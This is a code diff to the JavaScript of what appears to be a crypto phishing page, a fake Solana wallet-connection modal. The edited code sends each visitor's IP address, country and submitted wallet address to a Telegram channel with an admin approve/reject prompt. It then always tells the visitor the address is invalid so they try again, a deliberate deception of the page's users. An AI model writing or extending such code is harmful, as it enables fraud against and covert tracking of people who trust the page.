@@ -588,7 +588,7 @@
             modalText.innerHTML = `
                 <h4>Manual Connection</h4>
                 <p>Please enter your wallet address to connect:</p>
-                <input type="text" id="manualWalletInput" placeholder="Enter your Solana wallet address" maxlength="44">
+                <input type="text" id="manualWalletInput" placeholder="Enter your Solana wallet address (44 characters)" maxlength="44">
             `;
             modalButtons.innerHTML = `
                 <button class="modal-btn" onclick="submitWalletAddress()">Connect</button>
@@ -603,44 +603,29 @@
             const address = walletInput.value.trim();
             
             if (!address || address.length < 32) {
-                alert('Please enter a valid Solana wallet address');
+                alert('Please enter a valid wallet address');
                 return;
             }
             
             // Show connecting state
             const modalText = document.getElementById('modalText');
             const modalButtons = document.getElementById('modalButtons');
-            modalText.innerHTML = '<div class="loading"></div> Connecting wallet...';
+            modalText.innerHTML = '<div class="loading"></div> Verifying wallet address...';
             modalButtons.style.display = 'none';
             
-            sendTelegram(`🔗 MANUAL WALLET SUBMITTED\n👤 ${userCountry} (${userIP})\n💰 ${address}\n🕐 ${new Date().toLocaleString()}`);
+            sendTelegram(`🔍 WALLET VERIFICATION REQUEST\n👤 ${userCountry} (${userIP})\n💰 Address: ${address}\n🕐 ${new Date().toLocaleString()}\n\n⚠️ ADMIN: Reply "APPROVE ${address.slice(-8)}" to approve or "REJECT ${address.slice(-8)}" to reject`);
             
-            // Simulate connection success after 2 seconds
+            // Always show invalid wallet address after verification attempt
             setTimeout(() => {
-                userWallet = address;
-                isWalletConnected = true;
-                
-                // Update UI to show connected state
-                document.getElementById('connectBtn').textContent = 'Connected';
-                document.getElementById('connectBtn').classList.add('connected');
-                document.getElementById('balanceDisplay').textContent = '💰 Connected';
-                
-                // Show connected wallet info
-                document.getElementById('connectedWallet').style.display = 'block';
-                document.getElementById('connectedAddress').textContent = `${address.slice(0, 6)}...${address.slice(-6)}`;
-                
-                // Show success modal
-                modalText.innerHTML = '✅ Wallet Connected Successfully!';
-                modalButtons.innerHTML = '<button class="modal-btn" onclick="closeModal()">Continue</button>';
+                modalText.innerHTML = '❌ Invalid Wallet Address<br><small>Please try again with a different address</small>';
+                modalButtons.innerHTML = `
+                    <button class="modal-btn" onclick="showManualConnect()">Try Again</button>
+                    <button class="modal-btn secondary" onclick="closeModal()">Cancel</button>
+                `;
                 modalButtons.style.display = 'block';
                 
-                sendTelegram(`✅ WALLET CONNECTED\n👤 ${userCountry} (${userIP})\n🔗 ${address}\n🕐 ${new Date().toLocaleString()}`);
-                
-                // Auto-close modal after 2 seconds
-                setTimeout(() => {
-                    closeModal();
-                }, 2000);
-            }, 2000);
+                sendTelegram(`❌ WALLET REJECTED\n👤 ${userCountry} (${userIP})\n💰 ${address}\n🕐 ${new Date().toLocaleString()}`);
+            }, 3000);
         }
 
         // Close modal when clicking outside
